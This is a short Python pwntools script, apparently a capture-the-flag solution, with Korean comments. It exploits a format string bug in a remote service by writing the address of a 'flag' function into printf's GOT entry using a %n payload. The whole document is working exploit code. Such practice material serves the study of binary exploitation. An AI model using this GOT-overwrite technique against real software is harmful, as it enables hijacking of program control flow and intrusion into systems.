from pwn import *

# vuln 함수에 있는 FSB 취약점을 활용하여 flag 함수를 실행시켜야 한다
# 먼저 gdb-peda로 printf_got의 주소와 flag의 주소를 구한다
# flag 주소를 decimal로 바꾸고, 앞에 printf_got이 입력되므로 4byte를 뺀다
# 마지막에 %n을 입력하여 payload를 전송한다

r = remote('ctf.j0n9hyun.xyz', 3002)
printf_got = 0x0804A00C
flag = 0x80485B4

payload = p32(printf_got)
payload += b"%134514096x%n"

r.sendline(payload)
r.interactive()